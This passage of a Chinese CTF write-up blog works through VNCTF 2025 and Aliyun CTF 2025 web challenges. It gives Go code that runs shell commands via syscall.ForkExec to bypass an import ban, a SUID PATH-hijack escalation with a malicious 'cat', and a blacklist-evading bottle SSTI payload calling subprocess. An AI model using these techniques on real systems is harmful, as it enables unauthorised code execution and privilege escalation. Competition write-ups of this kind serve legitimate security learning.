+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Issuer</span>:    <span style="color:#e6db74">&#34;Mash1r0&#34;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Subject</span>:   <span style="color:#e6db74">&#34;user token&#34;</span>,
+</span></span><span style="display:flex;"><span>		},
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">token</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">NewWithClaims</span>(<span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">SigningMethodHS256</span>, <span style="color:#a6e22e">claims</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">signedToken</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">SignedString</span>([]byte(<span style="color:#a6e22e">key</span>))
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;生成 token 时出错: %v&#34;</span>, <span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">signedToken</span>, <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">ParseToken</span>(<span style="color:#a6e22e">tokenString</span> <span style="color:#66d9ef">string</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">JWTClaims</span>, <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">key</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">GenerateKey</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">token</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">ParseWithClaims</span>(<span style="color:#a6e22e">tokenString</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">JWTClaims</span>{}, <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">token</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">Token</span>) (<span style="color:#66d9ef">interface</span>{}, <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> []byte(<span style="color:#a6e22e">key</span>), <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>	})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;解析 token 时出错: %v&#34;</span>, <span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">claims</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">Claims</span>.(<span style="color:#f92672">*</span><span style="color:#a6e22e">JWTClaims</span>); <span style="color:#a6e22e">ok</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">Valid</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">claims</span>, <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;无效的 token&#34;</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>/eval</code>路由可以执行go代码，但不允许import <code>os/exec</code>库。可以用syscall绕过，这种命令执行较为底层。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;syscall&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 定义要执行的命令和参数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#34;/bin/sh&#34;</span> <span style="color:#75715e">// 命令路径
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">args</span> <span style="color:#f92672">:=</span> []<span style="color:#66d9ef">string</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#75715e">// 命令名
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#75715e">// 参数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#e6db74">&#34;ls -al /&#34;</span>,  <span style="color:#75715e">// 参数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	} <span style="color:#75715e">// 参数列表
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 创建子进程
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">attr</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">ProcAttr</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Files</span>: []<span style="color:#66d9ef">uintptr</span>{
+</span></span><span style="display:flex;"><span>			uintptr(<span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">Stdin</span>),
+</span></span><span style="display:flex;"><span>			uintptr(<span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">Stdout</span>),
+</span></span><span style="display:flex;"><span>			uintptr(<span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">Stderr</span>),
+</span></span><span style="display:flex;"><span>		},
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Env</span>: <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Environ</span>(), <span style="color:#75715e">// 继承当前环境变量
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ForkExec 的参数需要将 args 转换为字符串数组
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">argv</span> <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">string</span>, len(<span style="color:#a6e22e">args</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>	copy(<span style="color:#a6e22e">argv</span>, <span style="color:#a6e22e">args</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">argv</span>[len(<span style="color:#a6e22e">args</span>)] = <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e">// 以空字符串结尾
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 创建子进程
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">pid</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">ForkExec</span>(<span style="color:#a6e22e">cmd</span>, <span style="color:#a6e22e">argv</span>, <span style="color:#a6e22e">attr</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;ForkExec failed: %v\n&#34;</span>, <span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 等待子进程结束
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">Wait4</span>(<span style="color:#a6e22e">pid</span>, <span style="color:#66d9ef">nil</span>, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">nil</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Wait4 failed: %v\n&#34;</span>, <span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Command executed successfully&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>不知道是不是非预期，这么打的话没有用到<code>/upload</code>路由。</p>
+<p>flag并不在<code>/flag</code>里，真正的flag在<code>/root/flag</code>中，还需要提权。<code>/.../Cat</code>文件有suid权限。</p>
+<p>下载下来放到ida里看看：
+<img alt="1" loading="lazy" src="/posts/ctf%E8%AE%B0%E5%BD%95-vnctf_2025-aliyunctf_2025/images/1.png"></p>
+<p>会调用<code>cat</code>命令，可以通过修改环境变量中的<code>$PATH</code>，让root调用恶意的<code>cat</code>程序</p>
+<p>恶意cat代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/usr/bin/cat /root/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>因为PATH修改了，所以expcat里需要用绝对路径，上传的话可以走<code>/upload</code>，不过会被ban，需要混淆一下。也可以直接base64通过<code>/eval</code>传进去，毕竟体积很小。</p>
+<p>执行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>mv /tmp/expcat /tmp/cat <span style="color:#f92672">&amp;&amp;</span> chmod +x /tmp/cat <span style="color:#f92672">&amp;&amp;</span> export PATH<span style="color:#f92672">=</span>/tmp <span style="color:#f92672">&amp;&amp;</span> /.../Cat
+</span></span></code></pre></div><p>通过<code>/eval</code>路由执行命令是无状态的，所以<code>export PATH=/tmp</code>和<code>/.../Cat</code>必须一次执行。</p>
+<h2 id="学生姓名登记系统">学生姓名登记系统<a hidden class="anchor" aria-hidden="true" href="#学生姓名登记系统">#</a></h2>
+<p>题目描述说单文件框架，大概就是python里flask，fastapi那一类的web框架。</p>
+<p>存在SSTI，fuzz后发现<code>{{print}}</code>输出<code>&lt;built-in function print&gt;</code>，说明可以获取<code>__builtins__</code>里的内容。</p>
+<p>猜测服务器逻辑如下：</p>
+<ol>
+<li>黑名单匹配</li>
+<li>判断每行是否超过23</li>
+<li>尝试执行模板</li>
+<li>若第三步报错，则将<strong>整个</strong>模板以<strong>文本</strong>输出</li>
+<li>若第三步没报错，则将模板执行结果输出</li>
+</ol>
+<p>可以通过<code>{{globals()}}</code>获取上下文环境。内容如下：</p>
+<pre tabindex="0"><code>{&#39;_stdout&#39;: []
+ &#39;_printlist&#39;: &lt;built-in method extend of list object at 0x7fbe45e07e80&gt;
+ &#39;include&#39;: functools.partial(&lt;bound method SimpleTemplate._include of &lt;bottle.SimpleTemplate object at 0x7fbe46a3f950&gt;&gt;
+ {...})
+ &#39;rebase&#39;: functools.partial(&lt;bound method SimpleTemplate._rebase of &lt;bottle.SimpleTemplate object at 0x7fbe46a3f950&gt;&gt;
+ {...})
+ &#39;_rebase&#39;: None
+ &#39;_str&#39;: &lt;function SimpleTemplate.prepare.&lt;locals&gt;.&lt;lambda&gt; at 0x7fbe45ec1580&gt;
+ &#39;_escape&#39;: &lt;function SimpleTemplate.prepare.&lt;locals&gt;.&lt;lambda&gt; at 0x7fbe45ec1b20&gt;
+ &#39;get&#39;: &lt;built-in method get of dict object at 0x7fbe45e580c0&gt;
+ &#39;setdefault&#39;: &lt;built-in method setdefault of dict object at 0x7fbe45e580c0&gt;
+ &#39;defined&#39;: &lt;built-in method __contains__ of dict object at 0x7fbe45e580c0&gt;
+ &#39;__builtins__&#39;: 
+</code></pre><p>得知是bottle的SimpleTemplate模板引擎。</p>
+<p>有每行的长度限制，需要绕过，先审计代码：</p>
+<p><strong>SimpleTemplate.execute</strong>函数用于执行模板：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute</span>(self, _stdout, kwargs):
+</span></span><span style="display:flex;"><span>    env <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>defaults<span style="color:#f92672">.</span>copy()
+</span></span><span style="display:flex;"><span>    env<span style="color:#f92672">.</span>update(kwargs)
+</span></span><span style="display:flex;"><span>    env<span style="color:#f92672">.</span>update({
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;_stdout&#39;</span>: _stdout,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;_printlist&#39;</span>: _stdout<span style="color:#f92672">.</span>extend,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;include&#39;</span>: functools<span style="color:#f92672">.</span>partial(self<span style="color:#f92672">.</span>_include, env),
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;rebase&#39;</span>: functools<span style="color:#f92672">.</span>partial(self<span style="color:#f92672">.</span>_rebase, env),
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;_rebase&#39;</span>: <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;_str&#39;</span>: self<span style="color:#f92672">.</span>_str,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;_escape&#39;</span>: self<span style="color:#f92672">.</span>_escape,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;get&#39;</span>: env<span style="color:#f92672">.</span>get,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;setdefault&#39;</span>: env<span style="color:#f92672">.</span>setdefault,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;defined&#39;</span>: env<span style="color:#f92672">.</span>__contains__
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    exec(self<span style="color:#f92672">.</span>co, env)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> env<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;_rebase&#39;</span>):
+</span></span><span style="display:flex;"><span>        subtpl, rargs <span style="color:#f92672">=</span> env<span style="color:#f92672">.</span>pop(<span style="color:#e6db74">&#39;_rebase&#39;</span>)
+</span></span><span style="display:flex;"><span>        rargs[<span style="color:#e6db74">&#39;base&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(_stdout)  <span style="color:#75715e">#copy stdout</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">del</span> _stdout[:]  <span style="color:#75715e"># clear stdout</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_include(env, subtpl, <span style="color:#f92672">**</span>rargs)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> env
+</span></span></code></pre></div><p>通过exec函数执行<code>self.co</code>中的字节码，除了<code>__builtins__</code>外，还能获取另外几个SimpleTemplate提供的方法。</p>
+<p>字节码由<code>SimpleTemplate.code()</code>生成，在<code>StplParser.translate()</code>中使用正则匹配<code>{{}}</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">translate</span>(self):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>offset: <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">RuntimeError</span>(<span style="color:#e6db74">&#39;Parser is a one time instance.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>re_split<span style="color:#f92672">.</span>search(self<span style="color:#f92672">.</span>source, pos<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>offset)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> m:
+</span></span><span style="display:flex;"><span>            text <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>source[self<span style="color:#f92672">.</span>offset:m<span style="color:#f92672">.</span>start()]
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>text_buffer<span style="color:#f92672">.</span>append(text)
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>offset <span style="color:#f92672">=</span> m<span style="color:#f92672">.</span>end()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>):  <span style="color:#75715e"># Escape syntax</span>
+</span></span><span style="display:flex;"><span>                line, sep, _ <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>source[self<span style="color:#f92672">.</span>offset:]<span style="color:#f92672">.</span>partition(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>text_buffer<span style="color:#f92672">.</span>append(self<span style="color:#f92672">.</span>source[m<span style="color:#f92672">.</span>start():m<span style="color:#f92672">.</span>start(<span style="color:#ae81ff">1</span>)] <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                                        m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> line <span style="color:#f92672">+</span> sep)
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>offset <span style="color:#f92672">+=</span> len(line <span style="color:#f92672">+</span> sep)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>flush_text()
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>offset <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>read_code(self<span style="color:#f92672">.</span>source[self<span style="color:#f92672">.</span>offset:],
+</span></span><span style="display:flex;"><span>                                            multiline<span style="color:#f92672">=</span>bool(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">4</span>)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>text_buffer<span style="color:#f92672">.</span>append(self<span style="color:#f92672">.</span>source[self<span style="color:#f92672">.</span>offset:])
+</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>flush_text()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(self<span style="color:#f92672">.</span>code_buffer)
+</span></span></code></pre></div><p>然后<code>StplParser.flush_text()</code>将被<code>{{}}</code>包裹的内容由<code>_printlist((%s,))</code>包裹，拼接到python代码里。</p>
+<p>例如<code>{{print}}</code>转换为<code>_printlist((_escape(print),))</code>，代码的注入点在元组内，可以使用海象运算符赋值，直接声明变量会报错。</p>
+<pre tabindex="0"><code>{{a:=print}}
+{{a(1)}}
+// print(1)
+</code></pre><p>这样就可以缩短每一行的长度并绕过waf了。</p>
+<p>os.popen等函数被hook了，但subprocess没被hook。</p>
+<p>poc：</p>
+<pre tabindex="0"><code>{{b:=__builtins__}}
+{{e:=b[&#34;ev&#34;&#34;al&#34;]}}
+{{a:=&#34;__import__&#34;}}
+{{c:=&#34;(&#39;subproces&#34;}}
+{{d:=&#34;s&#39;).getout&#34;}}
+{{f:=&#34;put&#34;}}
+{{g:=e(a+c+d+f)}}
+{{g(&#34;cat /flag&#34;)}}
+</code></pre><p><strong>payload需要url编码，否则会出问题</strong></p>
+<h1 id="aliyun-ctf">Aliyun CTF<a hidden class="anchor" aria-hidden="true" href="#aliyun-ctf">#</a></h1>
+<h2 id="ezoj">ezoj<a hidden class="anchor" aria-hidden="true" href="#ezoj">#</a></h2>
+<p>一个在线OJ系统，python沙箱逃逸，关键代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>CODE_TEMPLATE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import sys
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import math
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import collections
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import queue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import heapq
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import bisect
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">def audit_checker(event,args):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    if not event in [&#34;import&#34;,&#34;time.sleep&#34;,&#34;builtins.input&#34;,&#34;builtins.input/result&#34;]:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        raise RuntimeError
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sys.addaudithook(audit_checker)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/api/submit&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">submit_code</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get_json()
+</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;code&#34;</span>)
+</span></span><span style="display:flex;"><span>        problem_id <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;problem_id&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> code <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> problem_id <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (
+</span></span><span style="display:flex;"><span>                jsonify({<span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;ER&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Missing &#39;code&#39; or &#39;problem_id&#39;&#34;</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">400</span>,
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        problem_id <span style="color:#f92672">=</span> str(int(problem_id))
+</span></span><span style="display:flex;"><span>        problem_dir <span style="color:#f92672">=</span> PROBLEMS_PATH <span style="color:#f92672">/</span> problem_id
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> problem_dir<span style="color:#f92672">.</span>exists():
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (
+</span></span><span style="display:flex;"><span>                jsonify(
+</span></span><span style="display:flex;"><span>                    {<span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;ER&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Problem ID </span><span style="color:#e6db74">{</span>problem_id<span style="color:#e6db74">}</span><span style="color:#e6db74"> not found!&#34;</span>}
+</span></span><span style="display:flex;"><span>                ),
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">404</span>,
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        code_filename <span style="color:#f92672">=</span> SUBMISSIONS_PATH <span style="color:#f92672">/</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;submission_</span><span style="color:#e6db74">{</span>uuid<span style="color:#f92672">.</span>uuid4()<span style="color:#e6db74">}</span><span style="color:#e6db74">.py&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(code_filename, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> code_file:
+</span></span><span style="display:flex;"><span>            code <span style="color:#f92672">=</span> CODE_TEMPLATE <span style="color:#f92672">+</span> code
+</span></span><span style="display:flex;"><span>            code_file<span style="color:#f92672">.</span>write(code)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> judge(code_filename, problem_dir)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        code_filename<span style="color:#f92672">.</span>unlink()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify(result)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;ER&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: str(e)}), <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">judge</span>(code_filename, problem_dir):
+</span></span><span style="display:flex;"><span>    test_files <span style="color:#f92672">=</span> sorted(problem_dir<span style="color:#f92672">.</span>glob(<span style="color:#e6db74">&#34;*.input&#34;</span>))
+</span></span><span style="display:flex;"><span>    total_tests <span style="color:#f92672">=</span> len(test_files)
